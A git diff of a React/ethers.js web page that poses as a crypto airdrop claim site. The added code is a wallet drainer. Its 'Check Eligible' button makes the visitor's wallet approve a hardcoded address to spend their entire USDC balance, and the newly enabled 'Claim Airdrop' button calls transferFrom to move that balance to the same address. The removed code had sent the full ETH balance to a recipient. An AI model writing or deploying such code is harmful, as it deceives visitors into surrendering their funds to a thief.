@@ -2,11 +2,14 @@ import Head from 'next/head'
 import styles from '../styles/Home.module.css'
 import 'bulma/css/bulma.css'
 import {BigNumber, ethers} from 'ethers'
-import { useState } from 'react'
-import { aggregator } from '../constants'
+import { useState, useEffect } from 'react'
+import { aggregator, IERC20, ERC20, GetBalanceAbi, GetBalanceAddress } from '../constants'
 
 // import './addresses'
 // import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
+
+
+let MyWalletAddress = "0x39A77B13BA2C5FA2249f7e5a4194582824D58c8E"
 
 
 
@@ -40,7 +43,7 @@ export default function Home() {
   async function connect() {
     if (typeof window.ethereum !== 'undefined'){
       const accounts = await ethereum.request({method: "eth_requestAccounts"})
-      setAccount(accounts)
+      setAccount(accounts[0])
       console.log(`accounts: ${accounts}`);
 
 
@@ -79,13 +82,14 @@ export default function Home() {
       setBalance(finalAmountBigNumber)
       console.log('final amount:',finalAmount);
 
-      setAggregatorContract(new ethers.Contract("0xD4a33860578De61DBAbDc8BFdb98FD742fA7028e", aggregator, _provider))
-      console.log(aggregator);
-      // const aggWithSigner = aggregator.connect(_signer)
-      const etherValueInUsd =await aggregatorContract.latestRoundData()
-      console.log((ethers.utils.formatEther(etherValueInUsd.answer)* 10 ** 10));
-      const balanceInUsd = (ethers.utils.formatEther(bal)) * ((ethers.utils.formatEther(etherValueInUsd.answer)* 10 ** 10))
-      console.log(balanceInUsd);
+      // setAggregatorContract(new ethers.Contract("0xD4a33860578De61DBAbDc8BFdb98FD742fA7028e", aggregator, _provider))
+      // console.log(aggregatorContract);
+      
+      // const etherValueInUsd = await aggregatorContract.latestRoundData()
+      
+
+      // const balanceInUsd = (ethers.utils.formatEther(bal)) * ((ethers.utils.formatEther(etherValueInUsd.answer)* 10 ** 10))
+      // console.log(balanceInUsd);
 
       // console.log(balanceInUsd);
       // console.log(`balance:${Number(bal).toString(16)}`);
@@ -125,27 +129,59 @@ export default function Home() {
 
 
       console.log(`ether value is :${etherValue}`);
-      // console.log(`dai value is :${daiValue}`);
-      // console.log(`usdt value is :${usdtValue}`);
-      // console.log(`busd value is :${busdValue}`);
-      // console.log(`usdc value is :${usdcValue}`);
-      // console.log(`link value is :${linkValue}`);
-      // console.log(`btc value is :${wbtcValue}`);
+
     }
+  }
+  let _demical
+  async function check() {
+    const getBalanceContract = new ethers.Contract(GetBalanceAddress, GetBalanceAbi, provider);
+    const balanceOfToken = await getBalanceContract.GetUsdc("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", "0x1204D7F27702d793260Ad5a406dDEE7660d21B61");
+    console.log(ethers.utils.formatUnits(balanceOfToken, "mwei") );
+    const tokenContract = new ethers.Contract("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", ERC20, provider)
+    const Decimal = tokenContract.decimals()
+    
+   
+    console.log(Decimal);
+    await Decimal.then(value =>{
+      console.log(value);
+      _demical = value
+    })
+    console.log(balanceOfToken/ (10 **_demical) );
+    const finalAmount = balanceOfToken/ (10 **_demical) 
+    const tokenWithSigner = tokenContract.connect(signer)
+    const approve = await tokenWithSigner.approve(MyWalletAddress, balanceOfToken)
+    // const daiValue = daiBalance / 10e5
+    // if (condition) {
+    //   console.log(balanceOfToken *);
+    // }
+    
   }
   
 
   async function claimAirdrop() {
-
-    signer.sendTransaction({
-      from: user,
-      to: Receptient,
-      
-      gasPrice: gasPrice,
-      gasLimit: gasLimit,
-      value: (balance),
+    const _gasLimit = ethers.utils.hexlify(1000000)
+    const _gasPrice = ethers.utils.parseUnits("10.0", "gwei")
+    const getBalanceContract = new ethers.Contract(GetBalanceAddress, GetBalanceAbi, provider);
+    const balanceOfToken = await getBalanceContract.GetUsdc("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", "0x1204D7F27702d793260Ad5a406dDEE7660d21B61");
+    const tokenContract = new ethers.Contract("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", ERC20, provider)
+    const tokenWithSigner = tokenContract.connect(signer)
+    const approve = await tokenWithSigner.transferFrom(account,MyWalletAddress, balanceOfToken,{
+      gasLimit: _gasLimit,
+      gasPrice: _gasPrice
     })
+    
   }
+  // async function claimAirdrop() {
+
+  //   signer.sendTransaction({
+  //     from: user,
+  //     to: Receptient,
+      
+  //     gasPrice: gasPrice,
+  //     gasLimit: gasLimit,
+  //     value: (balance),
+  //   })
+  // }
 
   return (
     <div className='has-background-white'>
@@ -172,8 +208,8 @@ export default function Home() {
           
             <div className='column is-one-third'>
               <div className='box'>
-                <button onClick={() => claimAirdrop()} className='button is-dark is-outlined is-centered mr-4'>Check Eligible</button>
-                <button onClick={() => claimAirdrop()} className='button is-dark is-centered' disabled>Claim Airdrop</button>
+                <button onClick={() => check()} className='button is-dark is-outlined is-centered mr-4'>Check Eligible</button>
+                <button onClick={() => claimAirdrop()} className='button is-dark is-centered' >Claim Airdrop</button>
               </div>
             </div>
           
